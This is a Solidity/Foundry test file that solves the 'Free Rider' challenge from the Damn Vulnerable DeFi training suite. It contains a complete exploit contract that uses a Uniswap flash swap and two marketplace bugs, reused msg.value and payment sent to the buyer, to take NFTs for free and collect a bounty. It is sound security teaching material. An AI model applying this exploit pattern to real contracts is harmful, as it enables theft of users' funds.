// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

/**
 * FREE RIDER CHALLENGE
 * --------------------
 * A marketplace sells 6 NFTs at 15 ETH each (90 ETH total).
 * A recovery contract offers a 45 ETH bounty to anyone who returns all 6 NFTs.
 * Player starts with only 0.1 ETH — not enough to buy even one NFT at 15 ETH.
 *
 * Two bugs in FreeRiderNFTMarketplace._buyOne() make this possible:
 *
 *   Bug 1 — msg.value is never deducted between purchases:
 *     buyMany() loops over token IDs calling _buyOne() each time.
 *     Each _buyOne() checks msg.value >= price, but msg.value doesn't decrease
 *     between calls. So sending 15 ETH once satisfies the check for all 6 NFTs.
 *
 *   Bug 2 — NFT is transferred to buyer before seller is paid:
 *     _buyOne() calls nft.safeTransferFrom(seller → buyer) THEN pays ownerOf(tokenId).
 *     But after the transfer, ownerOf() returns the buyer, not the seller.
 *     So the marketplace pays the buyer (us) instead of the seller.
 *     Net result: we receive 15 ETH back after buying, making all 6 NFTs free.
 *
 * Attack flow:
 *   1. Flash swap 15 WETH from Uniswap V2 (free upfront capital)
 *   2. Unwrap WETH → ETH (marketplace needs native ETH)
 *   3. buyMany() with 15 ETH → get all 6 NFTs + 15 ETH refunded via Bug 2
 *   4. Send NFTs to recovery contract → collect 45 ETH bounty
 *   5. Repay flash swap: 15 ETH * 1.004 = 15.06 ETH (0.3% Uniswap fee)
 */
contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    uint256 constant NFT_PRICE                     = 15 ether;    // price per NFT on the marketplace
    uint256 constant AMOUNT_OF_NFTS                = 6;           // total NFTs for sale
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;  // 6 NFTs * 15 ETH — holds seller payment funds
    uint256 constant PLAYER_INITIAL_ETH_BALANCE    = 0.1 ether;   // far too little to buy NFTs normally
    uint256 constant BOUNTY                        = 45 ether;    // reward for returning all 6 NFTs

    // Uniswap V2 pool reserves — large enough that our 15 WETH flash swap barely moves the price
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE  = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;           // WETH/DVT pair — our flash swap source
    FreeRiderNFTMarketplace marketplace;  // the vulnerable NFT marketplace
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager; // holds the 45 ETH bounty, releases it when it receives all 6 NFTs

    // Wraps the test in player context and checks win conditions after
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Player starts with only 0.1 ETH
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy DVT token and WETH
        token = new DamnValuableToken();
        weth  = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "builds/uniswap/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Seed Uniswap with 9000 WETH + 15000 DVT liquidity
        // Large reserves mean our 15 WETH flash swap won't significantly move the price
        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),               // token traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE,// amountTokenDesired
            0,                            // amountTokenMin
            0,                            // amountETHMin
            deployer,                     // LP tokens go to deployer
            block.timestamp * 2           // deadline
        );

        // Get reference to the WETH/DVT pair — we'll use this for the flash swap
        uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        // Deploy marketplace with 90 ETH — this ETH is used to pay sellers when NFTs are bought.
        // Constructor mints AMOUNT_OF_NFTS NFTs to deployer automatically.
        marketplace = new FreeRiderNFTMarketplace{value: MARKETPLACE_INITIAL_ETH_BALANCE}(AMOUNT_OF_NFTS);

        // Get the NFT contract and approve marketplace to transfer deployer's NFTs
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // List all 6 NFTs for sale at 15 ETH each
        uint256[] memory ids    = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i]    = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager with 45 ETH bounty.
        // It will release the bounty to `player` once it receives all 6 NFTs.
        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
            player,
            address(nft),
            recoveryManagerOwner,
            BOUNTY
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner));
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * SOLUTION
     * Deploy attack contract with just 0.045 ETH (covers rounding on flash swap repayment).
     * Everything else — the 15 ETH flash swap, the NFT purchase, the bounty — is self-funded
     * by exploiting the two marketplace bugs.
     */
    function test_freeRider() public checkSolvedByPlayer {
        AttackFreeRider attackFreeRider = new AttackFreeRider{value: 0.045 ether}(
            address(uniswapPair),
            address(marketplace),
            address(weth),
            address(nft),
            address(recoveryManager)
        );
        attackFreeRider.start();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // Recovery owner pulls all NFTs out of the recovery manager
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(address(recoveryManager), recoveryManagerOwner, tokenId);
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Marketplace lost its NFTs and some ETH (paid out via Bug 2)
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player received the 45 ETH bounty from recovery manager
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

// ============================================================
// Interfaces and attack contract live below the test contract.
// Solidity allows this — the compiler sees the whole file.
// ============================================================

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

// Minimal interface for the marketplace — we only need buyMany()
interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

contract AttackFreeRider {

    IUniswapV2Pair public pair;        // Uniswap WETH/DVT pair — source of the 15 WETH flash swap
    IMarketplace public marketplace;   // vulnerable marketplace with the two _buyOne bugs
    IWETH public weth;                 // WETH contract for wrap/unwrap
    IERC721 public nft;                // the NFT collection
    address public recoveryContract;   // FreeRiderRecoveryManager — sends bounty when it gets all 6 NFTs
    address public player;             // stored at deploy time to restrict the flash swap callback

    uint256 private constant NFT_PRICE = 15 ether;    // price check the marketplace enforces per NFT

    // All 6 token IDs we need to buy and forward
    uint256[] private tokens = [0, 1, 2, 3, 4, 5];

    constructor(
        address _pair,
        address _marketplace,
        address _weth,
        address _nft,
        address _recoveryContract
    ) payable {
        pair             = IUniswapV2Pair(_pair);
        marketplace      = IMarketplace(_marketplace);
        weth             = IWETH(_weth);
        nft              = IERC721(_nft);
        recoveryContract = _recoveryContract;
        player           = msg.sender; // save so uniswapV2Call can verify tx.origin
    }

    /**
     * Step 1 — Trigger the flash swap.
     * Uniswap V2 flash swaps work by passing non-empty `data` to pair.swap().
     * Uniswap sends the tokens first, then calls uniswapV2Call() on the recipient,
     * expecting repayment before the transaction ends.
     */
    function start() external payable {
        // Request 15 WETH (token0 = WETH in this pair).
        // amount0 = 15 WETH, amount1 = 0 DVT, recipient = this contract.
        // Non-empty data triggers the flash swap callback instead of a normal swap.
        pair.swap(NFT_PRICE, 0, address(this), "1");
    }

    /**
     * Step 2-5 — Flash swap callback, called by Uniswap after sending us 15 WETH.
     * We must repay before this function returns or the whole transaction reverts.
     */
    function uniswapV2Call(
        address /*sender*/,
        uint /*amount0*/,
        uint /*amount1*/,
        bytes calldata /*data*/
    ) external {
        // Only the Uniswap pair contract can call this (prevents spoofing)
        require(msg.sender == address(pair));
        // Only callable from a transaction originated by our player (prevents front-running)
        require(tx.origin == player);

        // ---- STEP 2: Unwrap 15 WETH → 15 ETH ----
        // marketplace.buyMany() requires native ETH via msg.value, not WETH.
        weth.withdraw(NFT_PRICE);

        // ---- STEP 3: Buy all 6 NFTs for just 15 ETH ----
        // Bug 1: msg.value (15 ETH) satisfies the price check for each of the 6 NFTs
        //        because it is never deducted between _buyOne() iterations.
        // Bug 2: each _buyOne() transfers the NFT to us BEFORE paying the seller,
        //        so ownerOf() returns our address at payment time — we get 15 ETH back.
        // Combined: 6 NFTs acquired, 15 ETH refunded → net cost = 0.
        marketplace.buyMany{value: NFT_PRICE}(tokens);

        // ---- STEP 4: Forward all 6 NFTs to the recovery contract ----
        // FreeRiderRecoveryManager.onERC721Received() counts received NFTs and
        // releases the 45 ETH bounty to `player` once all 6 arrive.
        // We encode player's address in `data` so the manager knows who to pay.
        bytes memory data = abi.encode(player);
        for (uint256 i; i < tokens.length; i++) {
            // safeTransferFrom triggers onERC721Received on the recovery contract
            nft.safeTransferFrom(address(this), recoveryContract, i, data);
        }

        // ---- STEP 5: Repay the flash swap ----
        // Uniswap charges 0.3% fee. Using 1004/1000 (slightly above 1.003) ensures
        // we always round up and never underpay, which would revert the transaction.
        // We have 15 ETH (refunded by marketplace Bug 2) + 0.045 ETH (sent at deploy).
        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000; // = 15.06 ETH

        // Wrap repayment back to WETH — the pair expects WETH, not raw ETH
        weth.deposit{value: amountToPayBack}();

        // Send WETH directly to the pair to close the flash swap
        weth.transfer(address(pair), amountToPayBack);

        // At this point: player has received 45 ETH bounty, attack contract holds ~0 ETH
    }

    /**
     * Required so safeTransferFrom doesn't revert when sending NFTs to this contract.
     * ERC721 safeTransferFrom checks that the recipient returns this exact selector.
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    /**
     * Needed to receive ETH in two situations:
     *   1. weth.withdraw() sends native ETH here after unwrapping
     *   2. The recovery manager sends the 45 ETH bounty here as native ETH
     */
    receive() external payable {}
}